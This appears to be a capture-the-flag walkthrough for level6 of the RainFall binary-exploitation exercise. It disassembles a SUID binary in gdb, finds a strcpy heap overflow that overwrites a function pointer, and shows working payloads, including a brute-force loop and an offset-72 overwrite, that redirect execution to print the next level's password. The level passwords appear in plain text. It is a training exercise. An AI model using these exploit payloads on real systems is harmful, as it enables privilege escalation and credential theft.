Login as `level6`.
```shell
┌──$ [~/42/2022/rainfall]
└─>  ssh 192.168.0.18 -p 4242 -l level6
level6@192.168.0.18's password: d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```
A `SUID` executable is located in the home directory.
```shell
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```
By looking binary, three functions are defined.
1. `n()` function calls `system("/bin/cat /home/user/level7/.pass")`
2. `m()` function outputs a line "Nope" on `stdout`
3. `main()` which allocates 64 a 4 bytes, assign `m()` to a function pointer variable, calls `strcpy()` and finally calls function pointer.
```gdb
level6@RainFall:~$ gdb ./level6
(gdb) info functions
[...]
0x08048454  n
0x08048468  m
0x0804847c  main
[...]
(gdb) disassemble m
Dump of assembler code for function m:
   0x08048468 <+0>:	push   %ebp
   0x08048469 <+1>:	mov    %esp,%ebp
   0x0804846b <+3>:	sub    $0x18,%esp
   0x0804846e <+6>:	movl   $0x80485d1,(%esp) 
   0x08048475 <+13>:	call   0x8048360 <puts@plt>
   0x0804847a <+18>:	leave
   0x0804847b <+19>:	ret
End of assembler dump.
(gdb) x/s 0x80485d1
0x80485d1:	 "Nope"
(gdb) disassemble n
Dump of assembler code for function n:
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave
   0x08048467 <+19>:	ret
End of assembler dump.
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt> # malloc(64)
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt> # malloc(4)
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx # edx = 0x8048468
   0x080484aa <+46>:	mov    0x18(%esp),%eax # eax = fnPointer
   0x080484ae <+50>:	mov    %edx,(%eax) # fnPointer = edx
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> # strcpy(av[1], str)
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax # fnPointer()
   0x080484d2 <+86>:	leave
   0x080484d3 <+87>:	ret
End of assembler dump.
```
SECURITY CONSIDERATIONS section on man page of `strcpy` indicates that the `strcpy()` can be misused in a manner which enables to change a running program's functionality through a buffer overflow attack.

By running executable with first argument containing 128 bytes, is seems that the value of function pointer is overwritten and program try to call something `0x41414141`.
```gdb
level6@RainFall:~$ gdb -q ./level6
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
(gdb) run $(python -c "print 'A'*128")
Starting program: /home/user/level6/level6 $(python -c "print 'A'*128")

Program received signal `SIGSEGV`, Segmentation fault.
0x41414141 in ?? ()
```
So, using address of `n()` function as argument it can be repeated n-times until it lay in right place.

Exploit and log on to the next level.
```shell
level6@RainFall:~$ for i in {0..100}; do ./level6 $(python -c "print '\x54\x84\x04\x08'*$i") | grep -v Nope && break; done
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
Or find offset using [BOF EIP Offset String Generator](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)
```gdb
level6@RainFall:~$ gdb --args ./level6  Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Reading symbols from /home/user/level6/level6...(no debugging symbols found)...done.
gdb-peda$ run

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x41346341 ('Ac4A')
EBX: 0xb7fd0ff4 --> 0x1a4d7c
ECX: 0xbffff8c0 ("c9Ad0Ad1Ad2A")
EDX: 0x804a060 ("c9Ad0Ad1Ad2A")
ESI: 0x0
EDI: 0x0
EBP: 0xbffff678 --> 0x0
ESP: 0xbffff64c --> 0x80484d2 (<main+86>:	leave)
EIP: 0x41346341 ('Ac4A')
EFLAGS: 0x210202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41346341
[------------------------------------stack-------------------------------------]
0000| 0xbffff64c --> 0x80484d2 (<main+86>:	leave)
0004| 0xbffff650 --> 0x804a008 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0008| 0xbffff654 --> 0xbffff868 ("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
0012| 0xbffff658 --> 0xb7fd0ff4 --> 0x1a4d7c
0016| 0xbffff65c --> 0xb7e5ee55 (<__cxa_atexit+53>:	add    esp,0x18)
0020| 0xbffff660 --> 0xb7fed280 (push   ebp)
0024| 0xbffff664 --> 0x0
0028| 0xbffff668 --> 0x804a050 ("Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41346341 in ?? ()
```
Using generated string of 100 bytes shows that offset is 72.
```sh
level6@RainFall:~$ ./level6 $(python -c "print 'A'*72 +'\x54\x84\x04\x08'" )
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
